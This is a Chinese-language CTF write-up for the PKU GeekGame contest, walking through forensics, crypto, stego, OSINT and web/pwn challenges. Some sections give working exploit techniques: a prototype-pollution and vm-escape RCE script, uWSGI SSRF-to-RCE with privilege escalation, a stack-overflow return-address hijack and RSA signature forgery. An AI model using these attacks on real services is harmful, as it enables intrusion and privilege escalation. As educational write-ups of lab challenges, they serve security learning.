---
author: Ferric
---

# WriteUp

## →签到←

pdf 文件里显然是 Webdings 字体，用 Acrobat 完整复制出来得到

```text
fa{aeAGetTm@ekaev!
lgHv__ra_ieGeGm_1}
```

上下交替拼接到一起即得 flag。

## 小北问答 Remake

### 1

搜“北京大学理科六号楼”应该搜不到相关结果。

### 2

[北京大学举办首届信息安全综合能力竞赛](https://mp.weixin.qq.com/s/voAN7LX655Hy5w3_cZmraA)

### 3

可在 [crt.sh](https://crt.sh/) 等网站查询证书透明度，注意到 7 月 11 日到 14 日有空窗期，前者证书过期时间即为答案，并记得要 GMT+8。

### 4

[OOO DEF CON CTF Quals](https://scoreboard2020.oooverflow.io/)，welcome-to-dc2020-quals 题目下载附件。

### 5

[A047659 - OEIS](https://oeis.org/A047659)，所需公式在 FORMULA 部分末尾。

### 6

[geekgame-0th/db.py at main · PKU-GeekGame/geekgame-0th](https://github.com/PKU-GeekGame/geekgame-0th/blob/main/src/choice/game/db.py#L33)

### 7

[peking university - bgp.he.net](https://bgp.he.net/search?search%5Bsearch%5D=peking+university&commit=Search)

### 8

遍历“[北京大学信息科学技术学院](http://eecs.pku.edu.cn/)”顶栏“系所中心”中的链接，在对应系所页面中查找最长的实验室名称，应该就能得到“[区域光纤通信网与新型光通信系统国家重点实验室-北京大学电子学系](https://ele.pku.edu.cn/sys/qygxtxwyxxgtxxtgjzdsys.htm)”。

## 共享的机器

在题目提供的“[其他工具](https://ropsten.etherscan.io/address/0xa43028c702c3B119C749306461582bF647Fd770a)”中查看 Contract，有直接的 Decompile Bytecode 选项，其验证 flag 正确性的过程就是用 `store[2]` 和传入参数进行一定运算再和 `store[3]` 比较，一致则说明 flag 正确。查看[最早一笔 transaction](https://ropsten.etherscan.io/tx/0x26c021f066afcd313150ca57bfe828b47f93c4986297b201e4dff02c525a9b2e#statechange)，可得知 `store[2]` 和 `store[3]` 的值 。实际上运算过程也只是对每 4 字节进行映射，依次枚举即可。

```python
s2 = 0x15eea4b2551f0c96d02a5d62f84cac8112690d68c47b16814e221b8a37d6c4d3
s3 = 0x293edea661635aabcd6deba615ab813a7610c1cfb9efb31ccc5224c0e4b37372
flag = 0

for i in range(64):
    for b in range(16):
        if ((b + 5 * i + ((s2 >> i * 4) & 15) * 7)) & 15 == (s3 >> i * 4) & 15:
            flag |= b << i * 4

print(bytes.fromhex(hex(flag)[2:]).decode())
```

## 翻车的谜语人

### Flag 1

做题比较少还没遇到过需要解密 tls 的 pcap，先直接过滤掉，注意还有其他未加密 http 流量与 ws 流量。观察 http 流量可知其与 iPython 有关，在 #54340 请求了 `GET /api/contents/Untitled.ipynb`，手动解析 #54344 返回的 JSON 可知内容为：

```python
import zwsp_steg
from Crypto.Random import get_random_bytes

def genflag():
    return 'flag{%s}'%binascii.hexlify(get_random_bytes(16)).decode()

flag1 = genflag()
flag2 = genflag()

key = get_random_bytes(len(flag1))

key
# output: b'\x1e\xe0[u\xf2\xf2\x81\x01U_\x9d!yc\x8e\xceX\r\x04\x94\xbc9\x1d\xd7\xf8\xde\xdcd\xb2Q\xa3\x8a?\x16\xe5\x8a9'

def xor_each(k, b):
    assert len(k)==len(b)
    out = []
    for i in range(len(b)):
        output.append(b[i]^k[i])
    return bytes(out)

encoded_flag1 = xor_each(key, flag1.encode())
encoded_flag2 = xor_each(key, flag2.encode())

with open('flag1.txt', 'wb') as f:
    f.write(binascii.hexlify(encoded_flag1))
```

而在 #11262 请求了 `GET /api/contents/flag1.txt`，解析 #11265 返回的 JSON 可知 flag1.txt 内容为

```text
788c3a1289cbe5383466f9184b07edac6a6b3b37f78e0f7ce79bece502d63091ef5b7087bc44
```

按照 Untitled.ipynb 中的 `xor_each` 函数和其中保存的 `key` 再次异或即可得 flag1。

### Flag 2

注意到 HTTP 流量中仅有 #52090 `DELETE /api/contents/flag2.txt` 和 #52091 `DELETE /api/contents/flag2.wav`，故无法直接获取 flag2.txt，但同样有 #47097 `GET /files/flag2.7z?download=1`，故可以 dump #47395 得到 flag2.7z。而在此之前有如 #14324 `GET /terminals/websocket/3` 的请求，容易知道是在 web terminal 中处理，其对应 ws 流量。追踪 #11 TCP 流即得知 terminal 中内容：

```text
root@you-kali-vm:~/course/geekgame 
root@you-kali-vm:~/course/geekgame pip3 install stego-lsb
Looking in indexes: https://pypi.tuna.tsinghua.edu.cn/simple
Collecting stego-lsb
  Downloading https://pypi.tuna.tsinghua.edu.cn/packages/8a/2b/5be4be36ccb3788f1443805583f9ab8182f88f15143778a72dc259b54557/stego_lsb-1.3.1.tar.gz (10 kB)
  Preparing metadata (setup.py) ... done
Requirement already satisfied: Click>=7.0 in /usr/local/lib/python3.8/dist-packages (from stego-lsb) (8.0.1)
Requirement already satisfied: Pillow>=5.3.0 in /usr/lib/python3/dist-packages (from stego-lsb) (6.2.1)
Requirement already satisfied: numpy>=1.15.4 in /usr/lib/python3/dist-packages (from stego-lsb) (1.17.4)
Building wheels for collected packages: stego-lsb
  Building wheel for stego-lsb (setup.py) ... done
  Created wheel for stego-lsb: filename=stego_lsb-1.3.1-py2.py3-none-any.whl size=12135 sha256=20d5395e597058e6e37da40acc32a1c876fc7f334c671591c422b048e38cb5f2
  Stored in directory: /root/.cache/pip/wheels/ee/b5/10/f779bd3e1c420586ef8cc2cb8768073362f51e3024e7116cc3
Successfully built stego-lsb
Installing collected packages: stego-lsb
Successfully installed stego-lsb-1.3.1
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
root@you-kali-vm:~/course/geekgame stegolsb wavsteg -h -i ki-ringtrain.wav -s flag2.txt -o flag2.wav -n 1
Using 1 LSBs, we can hide 297712 bytes
Files read                     in 0.00s
76 bytes hidden                in 0.01s
Output wav written             in 0.00s
root@you-kali-vm:~/course/geekgame 7za a flag2.7z flag2.wav -p"Wakarimasu! `date` `uname -nom` `nproc`"
\r\n7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive:
  0M Scan 1 file, 4763436 bytes (4652 KiB)
  
Creating archive: flag2.7z

Items to compress: 1

Files read from disk: 1
Archive size: 2935226 bytes (2867 KiB)
Everything is Ok
root@you-kali-vm:~/course/geekgame
```

flag2.7z 的密码与运行环境有关。可知 `uname -nom` 中的 `-n` 为 `you-kali-vm`，查询 i7-10510U 资料可知 `nproc` 输出为 8，则还需获知执行命令的时间。注意不同发行版 `date` 输出可能不同，对于 Kali 其格式如 `Fri 01 Jan 2021 11:45:14 AM CST`。#45019 请求 `GET /api/contents?type=directory`，手动解析 #45021 响应 JSON 可得 flag2.7z 创建时间为 `2021-11-06T07:44:16.312993Z` ，故 `date` 输出应与其相差不远。由于不确定时区故枚举小时，再枚举其前后一分钟内的时间尝试解压，得到密码（放出第二阶段提示后则简单许多）。使用 stego-lsb 设置相同的参数解密 flag2.wav 得到 flag2.txt，再和 Untitled.ipynb 中的 `key` 异或得到明文。

## 叶子的新歌

### 夢は時空を越えて

根据提示使用 [Mp3tag](https://www.mp3tag.de/en/index.html) 读取 mp3 文件元信息，专辑名有提示“Secret in Album Cover!!”，提取专辑封面（前后封面相同），检查 LSB 得到新的 png 图片。

![Aztec code](asset/aztec.png)

该图片为 Aztec code，解码提示查看直方图，得

![histogram](asset/histogram.png)

该图片为普通 Code-128，再解码得到网址 [xmcp.ltd/KCwBa](https://xmcp.ltd/KCwBa)，其中内容为 Ook! 语言。找个解释器执行即得 flag1。

## 在线解压网站

分析源码可知网站将用户上传得文件保存至 /dev/shm/zip/media/tmp.zip，原地解压后删除压缩包，用户可在上传压缩文件后下载解压后的文件。Flask 使用了默认的 string 参数故不接受 `/` 或 `%2F` 而避免了文件遍历，但网站未对压缩包内容进行过滤。（根据二阶段提示，）构造指向 /flag 的符号链接并使用 `zip -y` 打包，则解压出的符号链接将指向服务器上的 /flag，从而下载文件时 Flask 将按照符号链接提供服务器上真正的文件。

## 早期人类的聊天室

分析源码可知网站将用户发送的信息通过 socket 发送到其他某服务器，并回显响应信息。在读取 chatlog 的路由存在文件遍历问题，但无法访问 /flag，根据题面提示应当是权限问题。根据“Flag 即服务”题目组织形式成功读取到 run.sh，从而得知 Supervisor 与 uWSGI 的配置信息。

```sh
# run.sh
cd /usr/src/ufctf

cp /flagtmp /flag
echo "" > /flagtmp

chown nobody -R . \
    && chmod 0666 -R /tmp/* \
    && chown root:root /flag \
    && chmod 0600 /flag

socat UNIX-LISTEN:/sock/socat.sock,fork,reuseaddr TCP4:127.0.0.1:8080 &

nginx -c /etc/nginx/nginx.conf
exec supervisord -n -c /etc/supervisor-ctf.conf
```

```ini
; /etc/supervisor-ctf.conf

; ...
[program:uwsgi]
command=uwsgi --ini /tmp/uwsgi-ctf.ini
user=root
autorestart=true
autostart=true
startretries=3
redirect_stderr=true
startsecs=5
stdout_logfile=/tmp/supervisor.log
stopasgroup=true
killasgroup=true
priority=999
; ...
```

```ini
; /tmp/uwsgi-ctf.ini
[uwsgi]
socket = :3031
chdir = /usr/src/ufctf
manage-script-name = true
mount = /=app:app
master = true
uid = nobody
gid = nogroup
workers = 2
buffer-size = 65535
enable-threads = true
pidfile = /tmp/uwsgi.pid
```

可知 Supervisor 将以 root 用户启动 uWSGI，但 uWSGI 仅会以 nobody 用户启动 Flask server。然而由于聊天服务器可自由指定，故也可指定为 127.0.0.1:3031 发送给 uWSGI 实现 SSRF。查询资料（或根据二阶段提示）可发现 [uWSGI 远程代码执行漏洞](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md)，类似向 `UWSGI_FILE` 参数发送 `exec` 协议可实现 RCE。而 run.sh 又保证了当前 nobody 用户在 /tmp 下的权限，故思路明确为修改 /tmp/uwsgi-ctf.ini 以 root 用户启动 Flask server，再通过 Supervisor 重启 uWSGI 实现提权。一个粗糙的 web shell 见 code/chatroom.py。

然而实际执行遇到诸多问题。其一不确定 `SCRIPT_NAME` 参数作用，故仅原样照抄为 `/testapp`；其二不确定环境 Supervisor 是否正常工作，根据 [Things to know (best practices and “issues”) READ IT !!! — uWSGI 2.0 documentation](https://uwsgi-docs.readthedocs.io/en/latest/ThingsToKnow.html)，向 uWSGI 发送 SIGTERM 将重新加载，应发送 SIGINT 或 SIGQUIT 以关闭 uWSGI，然而关闭后竟无法拉起从而导致 Nginx 持续 502 而只能重启环境。最终手动实现拉起，即通过 RCE 执行

```sh
nohup sh -c "while true;do sleep 10;uwsgi -c /tmp/uwsgi-ctf.ini ; done"
```
持续尝试启动 uWSGI，以根据修改后的配置文件启动并绑定 3031 端口。而后 kill 子进程以将该循环（子进程的子进程）托孤给 1 号进程保证执行（不确定该步骤必要性），再终止 uWSGI 而后被循环重新拉起。执行 `whoami` 结果变为 `root`，成功读取 `/flag`。

## Flag 即服务

### 零·获得代码

简单尝试得知 api 存在 `%2F` 的文件遍历问题，而主页 Installation 部分指出其使用 Node.js 实现，故应存在 package.json，下载依赖 [jsonaas-backend](https://geekgame.pku.edu.cn/static/super-secret-jsonaas-backend-1.0.1.tgz) 即为源码。

`start_server` 函数进行 ``if (FLAG0 !== `flag{${0.1+0.2}}`)`` 的明文判断，故得到 flag0。

### 壹·开通会员

依据代码逻辑，需要将 flag1 传递给 /activate 以开通会员，并回显 flag1，说明应绕过 `if (req.query.code === FLAG1)` 的明文判断以得到 flag1。

原型链污染是 JavaScript 常见漏洞，源码也进行了一定防范。`waf` 函数要求传入参数（`in_path`，`out_path` 和 `prefix`）中不能包含一般 object 原型的属性名，即

```javascript
['constructor', '__defineGetter__', '__defineSetter__', 'hasOwnProperty', '__lookupGetter__', '__lookupSetter__', 'isPrototypeOf', 'propertyIsEnumerable', 'toString', 'valueOf', '__proto__', 'toLocaleString']
```

且以 `/` 分隔的 `in_path` 和 `out_path` 中不能出现下划线 `_`。但根据（第二阶段提示中）Express 参数解析方法，实际可向 `in_path` 参数传入数组。`waf` 中的 `indexOf` 将变成对数组元素的全文匹配从而无法生效，而在 index.js:68 中的 `+` 会将 `in_path` 重新转化为正确的字符串（Javascript 类型转换调用 `Array.toString`，数组中仅有一个元素时即为该元素 `toString` 方法的返回值）。为绕过下划线限制，不直接访问 `.__proto__` 而访问 `.constructor.prototype`。

又逻辑中实现了无处理的 undefsafe，从而可以构造 `in_path[0][0]=constructor/length` 得到 `1`，再通过 `out_path[0][0]=constructor/prototype/activated` 写入 `Object.prototype` 污染原型链。再次访问 `activate` 时，由于 `req.session` 中不含 `activated` 属性，将沿原型链向上查找得到 `1`，从而通过验证以得到 flag1。

### 贰·为所欲为

开通会员后可启用 eval 功能，但最靠前的中间件禁用了 `eval_settings` 路由。而其判断依据仅为 url 后缀，而根据 Express 路由匹配规则，在最后加一个 `/` 即可绕过从而开启 eval（通过原型链污染 `eval_enabled` 也不是不行）。

开启 eval 功能后会将 `in_path` 中匹配 `/^\([^a-zA-Z"',;]+\)$/` 的 term 在新进程的 `vm` 中执行获取结果，则显然是逃逸后利用 `eval` 实现 RCE。对于 `vm` 应注意在新进程中代码是通过 stdin 输入而非执行文件模块，故 global `this` 表现和在 REPL 中一致，即可以直接获取 `this.require`，而不需 `this.process.mainModule.require`；具体地，在 `vm` 中无法直接使用 `require`（无 Node.js 的注入），获取的 global `this` 为 `{}`，但其与外部 object 共享同一个 Object 原型，故可以通过 `this.constructor.constructor` 获取到 `Function` 的 constructor，该 constructor 中访问的 `this` 将为外部的 global `this`。假设已经通过 `child_process` 实现了 RCE，还需要能获取到执行结果，然而 `out_path` 中并不允许 eval。仍然考虑利用原型链污染，通过 `in_path` 以执行结果为 property name 写入 `Object.constructor.prototype.prototype`（应该可以简化）中，再通过 `in_path` 读出整个 `prototype` object 即可，尽管对于同一环境的多次执行在读取时都将输出而略显混乱。

那么问题仅剩绕过正则表达式校验，其禁止使用大小写字母、引号、逗号与分号。[JSFuck](http://www.jsfuck.com/) 显然符合要求，但仅使用 6 种符号注定会带来冗长的代码而无法被服务器处理（[431 Request Header Fields Too Large](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/431)，实测最大可接受长度不超过 40000 字节）。JSFuck 利用了 JavaScript 的类型转换特性，即连接字符串与其他类型的对象时会调用对象的 `toString` 方法从而获取到“true”“false”“undefined”等字符串，再通过下标索引到单个字符拼接，进而得到任意字符串。通过任意字符串的任意方法可以获取到 `Function` 的 constructor，从而可以传入任意代码实现 eval。由于没有数字的限制，对字符串进行下标索引时可以直接使用数字以节省代码长度；此外，对于部分难以构造的字母（如 h、q、w 和 z）以及 `child_process` 中被过滤掉的下划线还可通过 unescape 仅由百分号和 hex digit 组成的字符串得到（参考了 [Get full alphabet without using letters](https://stackoverflow.com/questions/28547205/get-full-alphabet-without-using-letters)）；再此外，正则表达式仅匹配了单双引号而未过滤掉反引号，故所有字符串都可用反引号包裹。具体实现可见 code/encode.js，结合前段方法即可获取 web shell。

```javascript
const got = require('got').default
const { CookieJar } = require('tough-cookie')
const encode = require('./encode')

const remote = 'https://prob11-lpvzbtc7.geekgame.pku.edu.cn/'

function _escape(str) {
    return str.split('').map(x =>
        '%' + x.charCodeAt(0).toString(16).padStart(2, 0)
    ).join('')
}

async function exec(command) {
    const agent = got.extend({ prefixUrl: remote, cookieJar: new CookieJar() })

    // enable eval
    await agent.get(`api/demo.json?in_path[0][0]=constructor/length&out_path[0][0]=constructor/prototype/activated`)
    await agent.get(`activate`)
    await agent.get(`eval_settings/?eval=on`)

    const vm_code = 'return this.constructor.constructor(`return this.require(unescape(\\`' + _escape('child_process') + '\\`)).execSync(unescape(\\`' + _escape(command) + '\\`)).toString()`)()'
    // escape % and + and new line
    await agent.get(`api/demo.json?in_path[0][0]=constructor/constructor/prototype/prototype/(${encode(vm_code).replace(/%/g, '%25').replace(/\+/g, '%2B').replace(/\n/g, '%0A')})`)
    // returns a very large object
    return (await agent.get(`api/demo.json?in_path[0][0]=constructor/constructor/prototype/prototype`)).body
}
```

题目还剩下一个点，即在 `getflag` 时 `unlink` 掉了 flag 文件从而无法直接通过 shell 读出，又在 `start_server` 中将已读取的 flag2 清除。但仔细观察可发现 `getflag` 函数并没有传统地直接以文件名为参数调用 `readFileSync`，而是通过 `openSync` 创建文件描述符后通过 fd 读取，且描述符始终没有被关闭。查看 /proc 下对应进程的 fd 即可发现仍然存在的管道，也仍然可从中读取到 flag2。

## 诡异的网关

根据第二阶段提示，发现保存账号密码后 config 文件有更新的更改时间。尽管打开类似乱码，但整体仍和提供的 config.xml 结构类似。观察即可发现，其中部分字符进行了对应基于 ascii 的 2n 与 2n+1 的对换（如 0x42 `b` 与 0x43 `c`，0x74 `<` 与 0x75 `=`）。有一个标签属性长得很像 flag，根据语义与 Leet code 手动对换一下得到 flag（应该是 flag 用户的密码）。

> 这题为什么算成 Binary 呢……还以为真得分析 exe（

## 字符串转义

分析源码可知，程序的主要工作即为顺序读取源码，若读到 `\` 且其后方字符不为空白符，则吞掉 `\` 只输出后方字符。题目涉及到读入 stdin，但缓冲区是动态申请的而避免了直接的缓冲区溢出。若输入长度不超过 128，则将输入拷贝到长度为 128 的 `ctx.input` 中，此处将导致 `ctx.input` 写满而将 `\0` 写入后方 `ctx.escaped`。而在文字处理过程中，两指针将从 `ctx.input` 和 `ctx.escaped` 开始读取和写入字符，在首次写入时即可能导致 `\0` 被覆盖从而处理超过 128 个字符。尝试输入 `a` * 128，的确导致读写溢出产生 SIGSEGV。又源码中有未调用的函数 `print_flag`，只需传入参数为 `./.flag` 即打印输出 flag，故思路明确：通过漏洞越界写覆盖栈内函数返回地址与存储的 $rbp，使 `work` 函数返回进入 `print_flag` 打印 flag。

checksec 该程序发现开启了 Canary，故覆盖返回地址前还需要读取 Canary。
注意到转移规则中的空白符并不包含 `\0`，从而若输入字符串后缀为长度为奇数的连续 `\` 串，则可在转义串中写入 `\0` 并向后跳转到输入串后方继续处理转义。基于此可以给出一种向任意位置写入字符串的方法：

- 若待写入位置位于 `ctx.escaped` 内，则直接使用非 `\` 字符 pad 后在输入串中拼接待写入字符串即可
- 若待写入位置位于 `ctx.escaped` 后，则可以使用若干（x 个）非 `\` 字符和若干(y 个) `\` pad 后在输入串中拼接待写入字符串，再根据具体写入位置拼接若干 `\\` 与一个 `\\0`，再拼接若干 (z 个，z 为奇数）`\`；其中的 x, y, z 可以通过解方程与约束得到
  - 举例如，希望向 `ctx.escaped` 后方写入 abcd，则输入字符串可为 `a`*41 `\` `abcdef` `\` `\0` `\`*77 `\0`，处理完 `ctx.input` 中内容时，`ctx.escaped` 内容将为 `a`*41 `abcdef` `\0` `\`*38 `\0`，此时 `from` 指针指向了 `ctx.escaped`，`to` 指针指向了 `ctx.escaped`+87，继续处理 `a`*41后 `from` 指针将指向 `abcdef`，而 `to` 指针指向 `ctx.escaped`+128，故可写入 `abcdef`。
  - 注意该方法需要写入一个 `\0`，实际上可以通过先写入 `\`*127 再写入前缀实现

能够向 `ctx.escaped` 后写入任意数据后，还需另一种方法：若输入为 `\`*128，则 `from` 指针会和 `to` 指针在 `ctx.escaped`+128 的位置汇合。若已写入 `ctx.escaped`+128 位置的数据以奇数个 `\` 结尾，则 `from` 指针又可以跳过之前在 `to` 后写入的 `\0`，将后方数据向前移动。考虑内存布局，`ctx.id` 后方即为 Canary，保存的 $rbp 和返回地址，可先将 Canary 和保存的 $rbp 向前移动到 `ctx.id` 位置，利用每次处理前提示的“Case #n:”泄露；对于返回地址还需要进行一次写入覆盖掉 `\0` 才能让 `from` 和 `to` 指针正确到达指定位置，再利用相同技巧即可。

得到返回地址后，可根据相对偏移量计算得到 `print_flag`+21 的地址（避免进入函数时修改栈指针）；得到保存的 $rbp 后，可知结合 `main` 函数得到返回后的 $rsp，再根据 $rsp 计算在 `print_flag` 中时正确的 $rbp 地址（保证进入函数时的栈帧正确性）。再从后向前依次写入修改后的返回地址、修改后的 $rbp 和原始的 Canary 即完成了执行流的劫持。

还需保证 `print_flag` 中读取到的参数，反汇编函数可知其作为指针存储于 $rbp-0x48 位置，则在写入修改地址前还应写入一个字符串 ./.flag ，并在计算得到的 $rbp-0x48 位置写入一个指向该字符串的地址，覆盖掉 `main` 函数的栈帧。这样便可以劫持进入 `print_flag` 函数后正确通过参数校验，读取 flag。

代码见 code/escape.py。注意返回地址和保存的 $rbp 中含有 `\0` 时有问题，但其概率很小，多次尝试执行即可。

## 最强大脑

### Flag 1

直接反编译静态阅读代码可知，其对于 Brainfuck 开辟了一段数据区并读取 flag1 存储在数据区末尾。只使用 > 和 . 即可分次读取 flag。

```python
from pwn import *

putchar = 4096
flag = ''
while putchar > 1:
    r = remote('prob13.geekgame.pku.edu.cn', 10013)
    r.sendlineafter(b'Please input your token: ', token)
    r.sendlineafter(b'give me code (hex): ', bytes((b'>' * (4096 - putchar) + b'.>' * (putchar // 2)).hex(), 'utf-8'))
    flag += r.recvall().decode('utf-8').strip('\x00')
    putchar = putchar // 2
    sleep(10) # connection rate limit
```

## 电子游戏概论

### Flag 1

根据第二阶段提示可得到 pyc 文件并反编译。阅读游戏逻辑代码不难发现在服务器传来的地图数据中已经区分了 `dirt` 与 `evildirt`。“在经过一些处理后”（如令 `evildirt` 直接显示为 `fire`）即可预判绕过而避免挖到 `evildirt` 而 `hurt`，“甚至可以手玩”。

不知是兼容问题还是需要编译为 pyc，事实上直接运行 py 文件效率极差而基本无法正常进行游戏，故在其基础上舍弃了 tcl/tk 而改用 curses 转换为命令行游戏，代码见 code/hidden_treasure.py（但 curses 可能无法在 cmd 和 Powershell 中直接使用）。尽管存在开局扣 6 命和不清空操作队列的问题，但还是能玩的。

### Flag 2

人力难以达到平均每关 6.67s 的挖掘速度，故该“Algorithm”题应期望实现“AI”。由于给定了整张地图，故可设计一种相对简单的搜索策略：

- 对于当前所在位置，尝试向同一行的左右挖掘延申但避免挖到 `evildirt` 或坠落，可得到一个可行区间
- 尝试在该区间内横向挖掘收集所有的 money 与 heart 并记录数量
- 对于可行区间的每一个 x，依次判断其下方 `dirt` (y+1, x) 所在的可行区间并递归进行有记忆的搜索，更新最多可获得的 money 与 heart 并记录对应可行区间路径
  - 如可行区间长度仅为 1，则判不可行，因无法向下挖掘
  - 可对 money 与 heart 进行一定的启发合并成一个值，实测 money+heart*1 即可。
- 返回最多可获得的 money 与 heart 与对应可行区间路径

进而可以根据获得的可行区间路径规划挖掘操作：

- 对于当前所在位置，先向左挖掘得到左方所有 money 与 heart，再向右挖掘得到所有 money 与 heart
- 找到路径中下一层可行区间与当前层可行区间的交集（一定存在）[l, r]
  - 如 x < l 则向右挖掘至 l-1 然后向下挖掘，向右行走并空置坠落
  - 如 x > r 则向左挖掘至 r+1 然后向下挖掘，向左行走并空置坠落
  - 如 x = l 则向右转并向下挖掘，向右行走并空置坠落
  - 否则向左转并向下挖掘，向左行走并空置坠落

然而这种简单的策略实际上包含了许多 corner case，包括但不限于：

- x = l = r 时，会向右下挖掘，无法保证挖到什么东西以及是否进入路径中下一层的可行区间
- 由于进入错误状态，可能导致连续下落（称为 FREEDOM DiVE↓ 或 dropdead）
- 向左或向右挖掘时，可能从上方落下 money 或 heart

对于 corner case 而言，若发生 dropdead 则直接退出，而期望错误右下挖掘与上方掉落物品发生的概率较小。

为保证逻辑清晰与“正确执行”，“AI”代码将原本的多线程事件队列改为单线程顺序收发，除游戏每关初始化消息序列（`sync_level` -> `sync_status` -> `sync_map` -> `init_level` -> `show_hud`）相对固定外，操作后响应依实际情况而不同：

- 若只是转身则只响应 `sync_status` -> `tick_routine`
- 若挖掘了 `dirt` 或 `evil_dirt` 或向左右行走则响应 `sync_status` -> `sync_map` -> `tick_routine`
- 若行走后处在空中则落地前均需要 `empty` 操作，并响应 `sync_status` -> `sync_map` -> `tick_routine`

实际响应规则应当更复杂或并不一致，不过利用该规则以及在每局游戏结束和开始时同步期望响应序列大概足够。

不断尝试可知该策略是可行的~~（一次没读到 flag，一次只读了 flag1）~~且用时不超过 60s，故跑个脚本自动重试以成为时间管理大师。

```sh
while [ ! -f 'flag.txt' ]; do
    timeout 60 python3 dig-ai.py > /dev/null;
done
```

事后查看时间大概花费半小时可以正确执行到 15 关~~，这与手动尝试得到的结果一致~~。未经完善整理的代码见 code/dig-ai.py。

> 这题才是 Binary 吧……做的人比较少可能因为上手就需要反编译 / 解包 ssl

## 密码学实践

### Flag 1

分析源码可知，Richard 将直接发送一条部分明文已知的包含 flag1 的消息，其使用随机的 key 加密。但 `MESenc` 函数的加密方式存在缺陷，其将明文对齐后分为若干 32 位长段，然后再将 32 位段分成 4 个 8 位段，进行一种循环与和 key 异或的操作。实际执行后，设原 32 位长段可表示为 (a, b, c, d) 为四个 8 位段，则加密后的信息为 (c&oplus;k<sub>0</sub>, d&oplus;k<sub>1</sub>, a&oplus;c&oplus;k<sub>2</sub>, b&oplus;d&oplus;k<sub>3</sub>) ，其中 k<sub>i</sub> 是仅与 key 相关的常数。

对于 Richard 发送的信息，其前 32 字节已知为“Hello, Alice! I will give you tw”，从而可以直接得到所需的 k<sub>i</sub>，进而解密消息后文。

### Flag 2

分析源码可知，Richard 验证证书后才会发送 flag2，故需要伪造 Alice 的证书，但验证方式只是检查证书有效且名字为 Alice。God 已经为 Alice 签发了证书而不能直接获得 Alice 的证书，但可以充分利用 RSA 的乘法同态性，即对于明文 m<sub>1</sub> 和 m<sub>2</sub>，二者明文乘积的密文为 (m<sub>1</sub>m<sub>2</sub>)<sup>e</sup> 等同于二者密文的乘积，即 m<sub>1</sub><sup>e</sup>m<sub>2</sub><sup>e</sup>。

注意到证书明文格式为 [name][name_len | 2B][key][key_len | 2B]，直接考虑伪造 [Alice][0005][][0000]。为此可先令 God 签发名字为空，key 为 Alice 的证书，得到 [][00][Alice][0005] 的密文，实际上就是 [Alice][0005] 的密文。只需再获取 0x10000 的密文，可以通过令 God 签发名字为 \x00，key 为空的证书，即为 [00][0001][][0000] 的密文。两证书相乘便得到了 [Alice][0005][][0000] 的密文，即所需伪造证书。

向 Richard 发送证书可通过验证，再使用和 flag1 一致的漏洞利用方法（已知明文变为“I can give you the second flag n”）即可获得 flag2。相关代码见 code/rsa.py。

## 扫雷

### Flag 1

分析源码可知，可以通过触发地雷后显示的游戏地图获知 `gen_board` 使用的随机数序列。而 hard 模式保证了可以拿到任意长的由 `Random` 连续生成的序列（或 flag1），故使用 [randcrack](https://pypi.org/project/randcrack/) 获取连续的 78 轮游戏数据（以收集 `Random` 连续生成的 624 个 32 位整数）匹配 Python 使用的 Mersenne Twister 法的内部状态矩阵并准确预测下一轮生成的地图。代码见 code/minesweeper.py。

## 龙珠模拟器

### Flag 1

分析源码可知，游戏将整个世界按照 7 个级别划分成了 7 种边长不同的区块，每个区块内有一颗对应级别的龙珠，其位置依据四个级别参数、游戏整体随机种子以及区块偏移决定。Basic 模式中，7 个级别区块的边长呈倍数关系且所有级别参数相同，故对于不同级别同偏移的区块（以 (0, 0) 为最左上角方格的区块）而言，区块随机数种子是相同的。

考察 Java 随机数实现，有上界的 `nextInt` 会生成一个能保证均匀离散均匀分布的 31 位整数，返回其对上界取模结果。对于不同级别同偏移的区块而言，由于种子一致，生成的整数也基本一致（如因不满足分布而有变则多次尝试即可），只是模数不同。又模数呈倍数关系，不难得出：若第 i 级别偏移为 (0, 0) 的区块内龙珠位置为 (x, y)，则第 i+1 级别偏移为 (0, 0) 的区块内龙珠位置只可能为 (x + k * chunkSize<sub>i</sub>, y + k * chunkSize<sub>i</sub>)，其中 0 &le; k &lt; chunkSize<sub>i + 1</sub> / chunkSize<sub>i</sub>。k 的上界只有 64，枚举即可。代码见 code/dragon.py。
